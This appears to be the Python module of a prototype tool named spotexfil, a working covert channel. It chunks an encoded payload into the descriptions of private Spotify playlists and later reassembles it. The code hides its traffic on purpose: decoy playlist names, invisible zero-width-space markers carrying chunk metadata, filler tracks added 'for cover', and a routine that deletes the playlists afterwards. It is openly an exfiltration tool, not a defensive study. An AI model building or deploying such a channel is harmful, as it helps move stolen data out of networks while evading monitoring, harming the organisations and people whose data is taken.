"""spotapi.py - Spotify API wrapper for covert channel operations.

Handles authentication, playlist CRUD, and payload chunking via
Spotify playlist descriptions (512 characters per playlist).
"""

import configparser
import html
import os
import random
import string
import sys
import time

import spotipy
import spotipy.util as util

__author__ = '@sourcefrenchy'
__copyright__ = 'none'
__email__ = 'jmamblat@icloud.com'
__status__ = 'PROTOTYPE'

# Playlist description size limit (empirically tested 2026-04, API rejects 513+)
CHUNK_SIZE = 512

# Max payload size before aborting (~2000 playlists)
MAX_PAYLOAD_SIZE = 1_023_999

# Default filler artists to pick from randomly
DEFAULT_ARTISTS = [
    "Tiesto", "Deadmau5", "Avicii", "Calvin Harris",
    "Martin Garrix", "Armin van Buuren", "David Guetta",
]

# Hidden marker embedded in playlist descriptions for identification
# Format: description = <chunk_data> + MARKER_SEP + <json metadata>
MARKER_SEP = "\u200b"  # zero-width space (invisible in Spotify UI)

# Innocuous playlist name templates
COVER_NAMES = [
    "Chill Vibes", "Morning Coffee", "Workout Mix", "Road Trip",
    "Late Night", "Study Session", "Party Hits", "Throwback",
    "Relaxation", "Good Mood", "Focus Flow", "Sunday Morning",
    "Summer Jams", "Indie Finds", "Deep Cuts", "Evening Wind Down",
    "Energy Boost", "Acoustic Covers", "Rainy Day", "Dance Floor",
]

# Config file search paths (first found wins)
CONFIG_PATHS = [
    os.path.join(os.getcwd(), '.spotexfil.conf'),
    os.path.expanduser('~/.spotexfil.conf'),
]


def load_config() -> dict:
    """Load Spotify credentials from config file if available.

    Searches .spotexfil.conf in CWD then home directory.
    Environment variables always take precedence.

    Returns:
        Dict of credential key->value pairs found in config.
    """
    config = configparser.ConfigParser()
    for path in CONFIG_PATHS:
        if os.path.isfile(path):
            config.read(path)
            if 'spotify' in config:
                section = config['spotify']
                result = {}
                key_map = {
                    'username': 'SPOTIFY_USERNAME',
                    'client_id': 'SPOTIFY_CLIENT_ID',
                    'client_secret': 'SPOTIFY_CLIENT_SECRET',
                    'redirect_uri': 'SPOTIFY_REDIRECTURI',
                }
                for conf_key, env_key in key_map.items():
                    if conf_key in section:
                        result[env_key] = section[conf_key]
                print(f"[*] Loaded config from {path}")
                return result
    return {}


class Spot:
    """Spotify API interface for covert data transmission."""

    def __init__(self, use_cover_names: bool = True):
        """Authenticate and establish a Spotify session.

        Args:
            use_cover_names: Use innocuous random playlist names
                instead of indexed marker names (default True).

        Raises:
            SystemExit: If environment variables are missing or auth fails.
        """
        self.use_cover_names = use_cover_names
        self.scope = (
            'user-library-read user-library-modify '
            'playlist-modify-private playlist-read-private'
        )
        self._load_credentials()
        self._authenticate()

    def _load_credentials(self):
        """Load Spotify credentials from config file then env vars.

        Config file values are used as defaults; env vars override.

        Raises:
            SystemExit: If any required variable is missing.
        """
        # Load config file defaults into env if not already set
        config_vals = load_config()
        for key, value in config_vals.items():
            if key not in os.environ:
                os.environ[key] = value

        required_vars = [
            "SPOTIFY_USERNAME", "SPOTIFY_REDIRECTURI",
            "SPOTIFY_CLIENT_ID", "SPOTIFY_CLIENT_SECRET",
        ]
        try:
            self.username = os.environ["SPOTIFY_USERNAME"]
            self.redirect_uri = os.environ["SPOTIFY_REDIRECTURI"]
            self.client_id = os.environ["SPOTIFY_CLIENT_ID"]
            self.client_secret = os.environ["SPOTIFY_CLIENT_SECRET"]
        except KeyError as err:
            print(f"[!] Missing environment variable: {err}")
            print(f"[!] Required: {', '.join(required_vars)}")
            print("[!] Set env vars or create ~/.spotexfil.conf")
            sys.exit(1)

    def _authenticate(self):
        """Obtain Spotify API token and create client.

        Raises:
            SystemExit: If token cannot be obtained.
        """
        try:
            token = util.prompt_for_user_token(
                self.username, self.scope, self.client_id,
                self.client_secret, self.redirect_uri
            )
            if not token:
                print("[!] Cannot obtain Spotify API token")
                sys.exit(1)
            self.spotipy = spotipy.Spotify(auth=token)
        except spotipy.SpotifyException as err:
            print(f"[!] Spotify authentication failed: {err}")
            sys.exit(1)

    def _get_all_playlists(self) -> list:
        """Fetch ALL user playlists with pagination.

        Returns:
            List of playlist dicts from the Spotify API.
        """
        all_playlists = []
        offset = 0
        limit = 50
        while True:
            batch = self.spotipy.user_playlists(
                self.username, limit=limit, offset=offset
            )
            items = batch.get('items', [])
            if not items:
                break
            all_playlists.extend(items)
            if batch.get('next') is None:
                break
            offset += limit
        return all_playlists

    def _is_payload_playlist(self, playlist: dict) -> bool:
        """Check if a playlist is a spotexfil payload playlist.

        Detects both legacy naming (N-payloadChunk) and new hidden
        marker format (zero-width space + JSON metadata).

        Args:
            playlist: Playlist dict from Spotify API.

        Returns:
            True if this is a payload playlist.
        """
        name = playlist.get('name', '')
        # Legacy format
        if 'payloadChunk' in name:
            return True
        # New format: check description for hidden marker
        desc = playlist.get('description', '')
        if MARKER_SEP in desc:
            return True
        return False

    def _get_chunk_index(self, playlist: dict) -> int:
        """Extract chunk index from a payload playlist.

        Supports both legacy (name prefix) and new (description
        metadata) formats.

        Args:
            playlist: Playlist dict with full description.

        Returns:
            Integer chunk index (0 if unparseable).
        """
        name = playlist.get('name', '')
        # Legacy format: "3-payloadChunk"
        if 'payloadChunk' in name:
            prefix = name.split('-')[0]
            try:
                return int(prefix)
            except ValueError:
                return 0
        # New format: metadata after zero-width space
        desc = playlist.get('description', '')
        if MARKER_SEP in desc:
            meta_str = desc.split(MARKER_SEP, 1)[1]
            try:
                import json
                meta = json.loads(meta_str)
                return meta.get('i', 0)
            except (json.JSONDecodeError, ValueError):
                return 0
        return 0

    def _get_chunk_data(self, description: str) -> str:
        """Extract payload data from a playlist description.

        Strips the hidden metadata suffix if present.

        Args:
            description: Raw playlist description.

        Returns:
            The payload chunk data only.
        """
        if MARKER_SEP in description:
            return description.split(MARKER_SEP, 1)[0]
        return description

    def _generate_cover_name(self) -> str:
        """Generate an innocuous-looking playlist name.

        Returns:
            Random name like "Chill Vibes #a3f2".
        """
        name = random.choice(COVER_NAMES)
        suffix = ''.join(random.choices(
            string.ascii_lowercase + string.digits, k=4
        ))
        return f"{name} #{suffix}"

    def clear_data(self):
        """Delete all payload playlists from the account.

        Detects both legacy and new format playlists.
        """
        playlists = self._get_all_playlists()
        count = 0

        # For new format, we need full descriptions
        for playlist in playlists:
            name = playlist.get('name', '')
            # Quick check on name for legacy
            if 'payloadChunk' in name:
                self.spotipy.user_playlist_unfollow(
                    self.username, playlist['id']
                )
                count += 1
                continue
            # For new format, fetch full playlist to get description
            try:
                full = self.spotipy.user_playlist(
                    self.username, playlist['id']
                )
                desc = full.get('description', '')
                if MARKER_SEP in desc:
                    self.spotipy.user_playlist_unfollow(
                        self.username, playlist['id']
                    )
                    count += 1
            except spotipy.SpotifyException:
                pass

        print(f"[*] Data cleared ({count} playlists removed)")

    def retrieve_playlists(self) -> str:
        """Retrieve and reassemble payload from playlist descriptions.

        Supports both legacy and new format playlists.

        Returns:
            Concatenated payload string from all matching playlists.

        Raises:
            SystemExit: If retrieval fails.
        """
        print("[*] Retrieving playlists")
        try:
            playlists = self._get_all_playlists()
        except spotipy.SpotifyException as err:
            print(f"[!] Cannot retrieve playlists: {err}")
            sys.exit(1)

        # Fetch full details and filter payload playlists
        payload_playlists = []
        for p in playlists:
            try:
                full = self.spotipy.user_playlist(
                    self.username, p['id']
                )
                full['name'] = p.get('name', '')
                if self._is_payload_playlist(full):
                    payload_playlists.append(full)
            except spotipy.SpotifyException as err:
                print(f"[!] Cannot read playlist {p['id']}: {err}")
                sys.exit(1)

        # Sort by chunk index
        payload_playlists.sort(key=self._get_chunk_index)

        descriptions = ''
        for playlist in payload_playlists:
            desc = html.unescape(playlist.get('description', ''))
            chunk = self._get_chunk_data(desc)
            descriptions += chunk
            display = playlist.get('name', playlist.get('id', '?'))
            idx = self._get_chunk_index(playlist)
            print(f"\t[*] Retrieved chunk {idx}: {display}")

        print(f"[*] Retrieved {len(payload_playlists)} chunks")
        return descriptions

    def generate_playlists(self, payload: str):
        """Chunk payload and store in Spotify playlist descriptions.

        Uses innocuous cover names with hidden metadata markers.

        Args:
            payload: The encoded payload string to transmit.

        Raises:
            SystemExit: If payload too large or API calls fail.
        """
        if len(payload) > MAX_PAYLOAD_SIZE:
            print(
                f"[!] Payload too large: {len(payload)} bytes. "
                f"Would need ~{len(payload) // CHUNK_SIZE} playlists. "
                f"Aborting."
            )
            sys.exit(1)

        print("[*] Generating playlists")

        # Account for metadata suffix in chunk size
        # Metadata format: MARKER_SEP + {"i":N} = ~10-15 chars
        meta_overhead = 20  # conservative
        effective_chunk = CHUNK_SIZE - meta_overhead

        if len(payload) <= effective_chunk:
            chunks = [payload]
        else:
            chunks = [
                payload[i:i + effective_chunk]
                for i in range(0, len(payload), effective_chunk)
            ]

        for idx, chunk in enumerate(chunks, start=1):
            if self.use_cover_names:
                playlist_name = self._generate_cover_name()
                import json
                meta = json.dumps({"i": idx}, separators=(',', ':'))
                description = chunk + MARKER_SEP + meta
            else:
                playlist_name = f"{idx}-payloadChunk"
                description = chunk

            try:
                playlist = self.spotipy.user_playlist_create(
                    self.username, playlist_name,
                    public=False, collaborative=False,
                    description=description
                )
                print(
                    f"\t[*] Created [{idx}/{len(chunks)}] "
                    f"{playlist_name} ({len(chunk)} chars)"
                )
            except spotipy.SpotifyException as err:
                print(f"[!] Cannot create playlist: {err}")
                sys.exit(1)

            # Add filler tracks for cover
            try:
                tracks = self._get_filler_tracks()
                if tracks:
                    self.spotipy.user_playlist_add_tracks(
                        self.username, playlist['id'], tracks
                    )
            except spotipy.SpotifyException as err:
                print(f"[!] Cannot add filler tracks: {err}")

            # Brief delay to avoid rate limiting
            time.sleep(0.1)

        print(f"[*] Data encoded and sent ({len(chunks)} playlists)")

    def _get_filler_tracks(self, count: int = 5) -> list:
        """Get random filler track IDs for cover.

        Picks a random artist from the pool each time.

        Args:
            count: Number of tracks to fetch.

        Returns:
            List of Spotify track ID strings.
        """
        artist = random.choice(DEFAULT_ARTISTS)
        try:
            results = self.spotipy.search(
                q=f'artist:{artist}', type='artist', limit=1
            )
            if not results['artists']['items']:
                return []

            artist_id = results['artists']['items'][0]['id']
            top_tracks = self.spotipy.artist_top_tracks(artist_id)
            tracks = top_tracks.get('tracks', [])
            return [t['id'] for t in tracks[:count]]
        except spotipy.SpotifyException:
            return []
